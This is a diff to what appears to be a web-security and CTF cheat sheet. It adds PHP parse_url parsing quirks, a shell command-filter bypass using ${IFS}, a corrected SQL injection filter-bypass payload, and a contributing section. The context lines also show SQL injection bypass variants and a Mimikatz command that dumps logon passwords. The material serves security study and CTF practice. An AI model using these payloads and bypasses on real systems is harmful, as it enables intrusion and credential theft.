@@ -373,6 +373,12 @@ array(1) {
         string(4) "id=1"
     }
     ```
+- `parse_url('//a/b')`
+    - host: `a`
+- `parse_url('..//a/b/c:80')`
+    - host: `..`
+    - port: `80`
+    - path: `//a/b/c:80`
 - `parse_url('///a.php?id=1')`
     - false
 
@@ -571,6 +577,9 @@ cat $(ls)
 
 . flag
 PS1=$(cat flag)
+
+`echo${IFS}${PATH}|cut${IFS}-c1-1`
+=> /
 ```
 
 ## ? and *
@@ -926,7 +935,7 @@ pop graphic-context
         - `id=concat(char(0x61),char(0x64),char(0x6d),char(0x69),char(0x6e))`
     - `?id=0e2union select 1,2,3` (科學記號)
         - `?id=1union select 1,2,3`會爛
-        - `?ud=0e1union(select~1,2,3)` (~)
+        - `?id=0e1union(select~1,2,3)` (~)
         - `?id=.1union select 1,2,3` (點)
     - `WHERE` => `HAVING` (繞關鍵字)
     - `AND` => `&&` (繞關鍵字)
@@ -2409,3 +2418,15 @@ state[i] = state[i-3] + state[i-31]`
 
 - Mimikatz
     - `mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt`
+
+----
+
+# Contributing
+
+Welcome to open Pull Request
+
+OR
+
+[![Buy me a coffee](https://www.buymeacoffee.com/assets/img/custom_images/black_img.png)](https://www.buymeacoffee.com/b4wKcIZ)
+
+
